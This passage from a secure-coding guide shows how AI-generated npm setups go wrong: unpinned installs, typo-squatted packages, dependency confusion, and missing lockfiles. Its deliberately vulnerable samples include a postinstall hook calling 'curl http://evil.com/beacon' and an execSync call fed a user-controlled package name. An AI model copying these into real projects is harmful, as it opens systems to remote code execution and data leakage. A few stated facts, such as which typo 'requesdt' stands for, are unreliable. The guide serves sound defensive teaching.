---
source: "languages/javascript/npm-supply-chain.md"
title: "npm Supply Chain Security"
heading: "How AI / Vibe Coding Generates This"
category: "language-vuln"
language: "javascript"
severity: "critical"
tags: [checklist, code, explanation, javascript, language-vuln, prevention, secure, vulnerability, vulnerable]
chunk: 3/8
---

## How AI / Vibe Coding Generates This

### 1. Unpinned Install Commands

```bash
# 🚫 VULNERABLE — AI-generated install instructions
npm install express react axios               # 💥 No version pin
npm install -g create-react-app               # 💥 Global install, no pin
npm install --save bcrypt                      # 💥 No ^ or ~ safety
```

### 2. Typo-Squatted Packages in AI-Generated Code

```json
// 🚫 VULNERABLE — AI-generated package.json
{
  "dependencies": {
    "bcryptjs": "^2.4.3",       // ✅ Correct
    "bcrpyt": "^1.0.0",         // 💥 Typo! 'bcrpyt' instead of 'bcrypt'
    "requesdt": "^2.28.0",      // 💥 Typo! 'requesdt' instead of 'requested'
    "loadash": "^4.17.21",      // 💥 Typo! 'loadash' instead of 'lodash'
    "express": "^4.18.0",       // ✅ Correct
    "ejs": "^3.1.0"             // ✅ EJS is real, but what about "ejx"?
  }
}
```

### 3. Pre/Postinstall Script Injection

```json
// 🚫 VULNERABLE — AI-generated scripts section
{
  "scripts": {
    "start": "node server.js",
    "install": "node setup.js",           // 💥 Runs on every npm install
    "postinstall": "curl http://evil.com/beacon"  // 💥 If added by malicious package
  }
}
```

### 4. Inline Package Installation at Runtime

```javascript
// 🚫 VULNERABLE — AI-generated runtime installer
const { execSync } = require('child_process');

function ensurePackage(name) {
  try {
    require.resolve(name);
  } catch {
    // AI installs packages on-the-fly in production
    execSync(`npm install ${name}`, { stdio: 'inherit' });  // 💥 RCE!
  }
}

// Called with user input
ensurePackage(req.query.plugin);  // 💥 Attacker controls package name
```

### 5. Missing or Ignored Lockfiles

```dockerfile
# 🚫 VULNERABLE — AI-generated Dockerfile
FROM node:18

WORKDIR /app
COPY package*.json ./
RUN npm install  # 💥 No package-lock.json! Versions can drift
COPY . .
CMD ["node", "server.js"]
```

### 6. Scoped Packages Without Ownership Verification

```json
// 🚫 VULNERABLE — Dependency confusion
{
  "dependencies": {
    "@my-company/analytics": "^1.0.0",  // 💥 If this doesn't exist in private registry,
                                         // npm will look at public npm!
    "@internal/logger": "^2.3.0"         // 💥 Anyone can publish this on public npm
  }
}
```

### Why AI Does This

- **Tutorial code uses unpinned installs:** Every tutorial says `npm install express`, not `npm install express@4.18.2`
- **Token prediction generates typos:** AI models predict the next token — `requesdt` is close to `request` and `-ed` suffix
- **No lockfile awareness:** AI training data rarely discusses `package-lock.json` integrity
- **"Just make it work" mentality:** AI prioritizes functional code over secure delivery
- **No concept of supply chain risk:** AI doesn't simulate an attacker compromising a package

---